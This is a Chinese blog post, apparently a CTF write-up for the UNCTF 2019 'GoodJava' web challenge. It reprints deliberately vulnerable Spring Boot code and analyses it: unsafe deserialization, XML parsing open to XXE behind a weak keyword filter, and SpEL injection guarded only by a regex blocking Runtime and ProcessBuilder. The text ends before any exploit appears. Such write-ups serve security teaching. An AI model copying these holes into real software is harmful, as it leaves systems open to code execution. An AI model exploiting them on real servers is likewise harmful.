<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言这次打了unctf感觉他的web脑洞有点多没什么意思，不过有道java还是可以学到东西的，因此记录一下。 GoodJava0x01 源码分析题目中有用的代码不是很多，下面给出主要的代码。Server.class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051">
<meta property="og:type" content="article">
<meta property="og:title" content="2019unctf的部分web题解">
<meta property="og:url" content="http://yoursite.com/2019/10/30/2019unctf的部分web题解/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言这次打了unctf感觉他的web脑洞有点多没什么意思，不过有道java还是可以学到东西的，因此记录一下。 GoodJava0x01 源码分析题目中有用的代码不是很多，下面给出主要的代码。Server.class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5be133f0-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5bffcfea-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c0ed63e-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c18d5da-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c220bfa-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c2b10e2-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c37a0a0-0c94-1.png">
<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c58a458-0c94-1.png">
<meta property="og:image" content="https://user-gold-cdn.xitu.io/2019/5/15/16abb5947cce6154?imageslim">
<meta property="og:image" content="https://user-gold-cdn.xitu.io/2019/5/15/16abb597cbf6f417?imageslim">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.00.38-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.31.53-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.32.11-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.41.04-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.46.40-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.49.25-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.39.57-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.56.29-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.40.55-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.43.38-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.45.05-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.47.12-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.22.01.46-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.49.20-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.54.03-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.55.47-image.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png">
<meta property="og:updated_time" content="2019-10-30T07:14:19.995Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019unctf的部分web题解">
<meta name="twitter:description" content="前言这次打了unctf感觉他的web脑洞有点多没什么意思，不过有道java还是可以学到东西的，因此记录一下。 GoodJava0x01 源码分析题目中有用的代码不是很多，下面给出主要的代码。Server.class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051">
<meta name="twitter:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5be133f0-0c94-1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/10/30/2019unctf的部分web题解/">





  <title>2019unctf的部分web题解 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/30/2019unctf的部分web题解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2019unctf的部分web题解</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-30T14:58:41+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  21.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  94
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次打了unctf感觉他的web脑洞有点多没什么意思，不过有道java还是可以学到东西的，因此记录一下。</p>
<h4 id="GoodJava"><a href="#GoodJava" class="headerlink" title="GoodJava"></a>GoodJava</h4><h4 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h4><h5 id="题目中有用的代码不是很多，下面给出主要的代码。"><a href="#题目中有用的代码不是很多，下面给出主要的代码。" class="headerlink" title="题目中有用的代码不是很多，下面给出主要的代码。"></a>题目中有用的代码不是很多，下面给出主要的代码。</h5><h5 id="Server-class"><a href="#Server-class" class="headerlink" title="Server.class"></a>Server.class</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.com.unctf.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unctf.Controller.Server;</span><br><span class="line"><span class="keyword">import</span> com.unctf.lalala.OIS;</span><br><span class="line"><span class="keyword">import</span> com.unctf.pojo.Man;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="meta">@RequestMapping</span>(value = &#123;<span class="string">"/server"</span>&#125;, method = &#123;RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">server</span><span class="params">(@RequestBody <span class="keyword">byte</span>[] requestStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Base64.Decoder base64 = Base64.getDecoder();</span><br><span class="line">    requestStream = base64.decode(requestStream);</span><br><span class="line">    </span><br><span class="line">    InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(requestStream);</span><br><span class="line">    OIS ois = <span class="keyword">new</span> OIS(inputStream);</span><br><span class="line">    Man man = (Man)ois.readObject();</span><br><span class="line">    ois.close();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello "</span> + man.name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value = &#123;<span class="string">"/admin"</span>&#125;, method = &#123;RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@RequestParam(<span class="string">"secret"</span>)</span> String secret, @<span class="title">RequestParam</span><span class="params">(<span class="string">"name"</span>)</span> String name) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!secret.equals(readFile(<span class="string">"/passwd"</span>, StandardCharsets.UTF_8))) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"你不是管理员！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">"Runtime|ProcessBuilder|Process"</span>, <span class="number">2</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(name);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"想都不要想"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SpelExpressionParser spelExpressionParser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    Expression res = spelExpressionParser.parseExpression(name);</span><br><span class="line">    <span class="keyword">return</span> res.getValue().toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">static</span> String <span class="title">readFile</span><span class="params">(String path, Charset encoding)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] encoded = Files.readAllBytes(Paths.get(path, <span class="keyword">new</span> String[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(encoded, encoding);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="OIS-class"><a href="#OIS-class" class="headerlink" title="OIS.class"></a>OIS.class</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.com.unctf.lalala;</span><br><span class="line"><span class="keyword">import</span> com.unctf.lalala.OIS;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OIS</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] whitelist = &#123; <span class="string">"com.unctf.pojo.Man"</span> &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">OIS</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException </span>&#123; <span class="keyword">super</span>(is); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Class&lt;?&gt; resolveClass(ObjectStreamClass des) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!Arrays.asList(whitelist).contains(des.getName())) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"Cannot deserialize "</span> + des.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(des);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Man-class"><a href="#Man-class" class="headerlink" title="Man.class"></a>Man.class</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.com.unctf.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unctf.pojo.Man;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Man</span></span></span><br><span class="line"><span class="class">  <span class="keyword">implements</span> <span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">54618731L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Man</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream requestStream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> paramInt = requestStream.readInt();</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[paramInt];</span><br><span class="line">    </span><br><span class="line">    requestStream.read(arrayOfByte);</span><br><span class="line">    String xmlcontent = <span class="keyword">new</span> String(arrayOfByte);</span><br><span class="line">    </span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">"file"</span>, <span class="number">2</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(xmlcontent);</span><br><span class="line">    <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">      <span class="keyword">this</span>.name = <span class="string">"bad hacker"</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    ByteArrayInputStream localByteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(arrayOfByte);</span><br><span class="line">    DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    localDocumentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">    DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();</span><br><span class="line">    Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);</span><br><span class="line">    NodeList nodeList = localDocument.getElementsByTagName(<span class="string">"name"</span>);</span><br><span class="line">    Node node = nodeList.item(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">this</span>.name = node.getTextContent();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="上面的这三个类是主要的，其余的都是空架的代码，采用的框架是sprint-boot"><a href="#上面的这三个类是主要的，其余的都是空架的代码，采用的框架是sprint-boot" class="headerlink" title="上面的这三个类是主要的，其余的都是空架的代码，采用的框架是sprint-boot"></a>上面的这三个类是主要的，其余的都是空架的代码，采用的框架是sprint-boot</h5><h5 id="下面开始分析每个类的代码。"><a href="#下面开始分析每个类的代码。" class="headerlink" title="下面开始分析每个类的代码。"></a>下面开始分析每个类的代码。</h5><h4 id="0x1-Server-class"><a href="#0x1-Server-class" class="headerlink" title="0x1 Server.class"></a>0x1 Server.class</h4><h5 id="1-在Server类中我们可以看到有两个路由-server-admin。并且请求方式都是post，但是他们接收的数据类型不同，一个是接收字节流，一个是接收字符串。"><a href="#1-在Server类中我们可以看到有两个路由-server-admin。并且请求方式都是post，但是他们接收的数据类型不同，一个是接收字节流，一个是接收字符串。" class="headerlink" title="1.在Server类中我们可以看到有两个路由/server,/admin。并且请求方式都是post，但是他们接收的数据类型不同，一个是接收字节流，一个是接收字符串。"></a>1.在Server类中我们可以看到有两个路由<code>/server</code>,<code>/admin</code>。并且请求方式都是<code>post</code>，但是他们接收的数据类型不同，一个是接收字节流，一个是接收字符串。</h5><h5 id="2-在-server中需要把接收的字节流先base64-decode然后在推到字节数组缓冲流中，然后传到OIS类中实例化。"><a href="#2-在-server中需要把接收的字节流先base64-decode然后在推到字节数组缓冲流中，然后传到OIS类中实例化。" class="headerlink" title="2.在/server中需要把接收的字节流先base64.decode然后在推到字节数组缓冲流中，然后传到OIS类中实例化。"></a>2.在<code>/server</code>中需要把接收的字节流先<code>base64.decode</code>然后在推到字节数组缓冲流中，然后传到<code>OIS</code>类中实例化。</h5><h5 id="3-最后我们再把数据反序列化出来的时候，指定为我们Man类的特殊过滤。"><a href="#3-最后我们再把数据反序列化出来的时候，指定为我们Man类的特殊过滤。" class="headerlink" title="3.最后我们再把数据反序列化出来的时候，指定为我们Man类的特殊过滤。"></a>3.最后我们再把数据反序列化出来的时候，指定为我们<code>Man</code>类的特殊过滤。</h5><h5 id="4-最后回显到页面。"><a href="#4-最后回显到页面。" class="headerlink" title="4.最后回显到页面。"></a>4.最后回显到页面。</h5><h5 id="5-在-admin中我们有两个判断，第一个是通过读取-passwd下的secret，如果我们发送的和他的相等那么就可以绕过。"><a href="#5-在-admin中我们有两个判断，第一个是通过读取-passwd下的secret，如果我们发送的和他的相等那么就可以绕过。" class="headerlink" title="5.在/admin中我们有两个判断，第一个是通过读取/passwd下的secret，如果我们发送的和他的相等那么就可以绕过。"></a>5.在<code>/admin</code>中我们有两个判断，第一个是通过读取<code>/passwd</code>下的secret，如果我们发送的和他的相等那么就可以绕过。</h5><h5 id="6-第二个判断是一个正则表达式，这个正则表达式把java中常见的执行shell命令的函数给过滤了。"><a href="#6-第二个判断是一个正则表达式，这个正则表达式把java中常见的执行shell命令的函数给过滤了。" class="headerlink" title="6.第二个判断是一个正则表达式，这个正则表达式把java中常见的执行shell命令的函数给过滤了。"></a>6.第二个判断是一个正则表达式，这个正则表达式把java中常见的执行shell命令的函数给过滤了。</h5><h5 id="7-它使用了Spring空架同时用了SPEL表达式，由于它使用的版本不安全因此存在注入。"><a href="#7-它使用了Spring空架同时用了SPEL表达式，由于它使用的版本不安全因此存在注入。" class="headerlink" title="7.它使用了Spring空架同时用了SPEL表达式，由于它使用的版本不安全因此存在注入。"></a>7.它使用了Spring空架同时用了<code>SPEL</code>表达式，由于它使用的版本不安全因此存在注入。</h5><h4 id="0x2-OIS-class"><a href="#0x2-OIS-class" class="headerlink" title="0x2 OIS.class"></a>0x2 OIS.class</h4><h5 id="在OIS类中定义了白名单："><a href="#在OIS类中定义了白名单：" class="headerlink" title="在OIS类中定义了白名单："></a>在<code>OIS</code>类中定义了白名单：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] whitelist = &#123; <span class="string">"com.unctf.pojo.Man"</span> &#125;;</span><br></pre></td></tr></table></figure>

